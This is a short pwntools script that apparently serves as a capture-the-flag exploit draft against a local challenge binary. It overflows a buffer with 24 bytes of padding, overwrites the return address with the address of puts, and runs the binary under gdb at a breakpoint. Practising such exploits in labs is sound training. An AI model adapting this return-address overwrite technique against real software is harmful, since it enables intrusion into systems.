#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./chall',checksec=False)

p = process()
gdb.attach(p,gdbscript='''
          b*0x00000000004011d5
           ''')
input()
payload = b'a'*24
payload += p64(exe.sym.puts)
p.sendline(payload)

p.interactive()
